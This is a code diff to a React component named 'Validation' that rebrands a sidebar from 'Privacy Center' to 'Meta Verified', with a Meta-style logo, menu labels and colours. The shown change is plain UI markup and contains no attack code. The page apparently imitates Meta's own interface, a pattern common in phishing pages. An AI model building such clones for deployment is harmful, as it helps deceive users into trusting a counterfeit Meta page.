@@ -85,7 +85,12 @@ export default function Validation() {
       {/* Left Sidebar */}
       <div className="hidden md:flex w-[320px] bg-white flex-col border-r h-screen">
         <div className="p-4">
-          <h1 className="text-lg font-semibold mb-4">Privacy Center</h1>
+          <div className="flex items-center mb-4">
+            <svg className="h-8 w-8 text-[#0180FA]" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23" fill="none">
+              <path fillRule="evenodd" clipRule="evenodd" d="M21.0802 11.9059C21.0802 16.9014 16.9015 21.0802 11.9059 21.0802C6.91041 21.0802 2.73169 16.9014 2.73169 11.9059C2.73169 6.91041 6.91041 2.73169 11.9059 2.73169C16.9015 2.73169 21.0802 6.91041 21.0802 11.9059ZM23 11.9059C23 18.0195 18.0195 23 11.9059 23C5.79239 23 0.811859 18.0195 0.811859 11.9059C0.811859 5.79239 5.79239 0.811859 11.9059 0.811859C18.0195 0.811859 23 5.79239 23 11.9059ZM11.9059 19.1604C15.8411 19.1604 18.9995 16.002 18.9995 12.0668C18.9995 8.13157 15.8411 4.97319 11.9059 4.97319C7.97064 4.97319 4.81226 8.13157 4.81226 12.0668C4.81226 16.002 7.97064 19.1604 11.9059 19.1604Z" fill="#0180FA"/>
+            </svg>
+            <h1 className="text-lg font-semibold ml-2">Meta Verified</h1>
+          </div>
           <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 py-2 mb-4">
             <Search className="w-4 h-4 mr-2 text-[#65676B]" />
             <input
@@ -94,20 +99,20 @@ export default function Validation() {
               className="bg-transparent outline-none w-full text-sm text-[#65676B] placeholder-[#65676B]"
             />
           </div>
-          <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center mb-2">
+          <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center mb-2 text-[#65676B]">
             <Home className="w-4 h-4 mr-2" />
-            Privacy Center Home Page
+            Home Page
           </button>
           <div className="space-y-2">
-            <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center justify-between">
-              <span>Privacy Policy</span>
+            <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center justify-between text-[#65676B]">
+              <span>Meta Verified</span>
               <ChevronDown className="w-4 h-4" />
             </button>
-            <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center justify-between">
-              <span>Other rules and articles</span>
+            <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center justify-between text-[#65676B]">
+              <span>Rules and Guidelines</span>
               <ChevronDown className="w-4 h-4" />
             </button>
-            <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center justify-between">
+            <button className="w-full text-left px-3 py-2 rounded-md hover:bg-[#F0F2F5] text-sm flex items-center justify-between text-[#65676B]">
               <span>Settings</span>
               <Settings className="w-4 h-4" />
             </button>
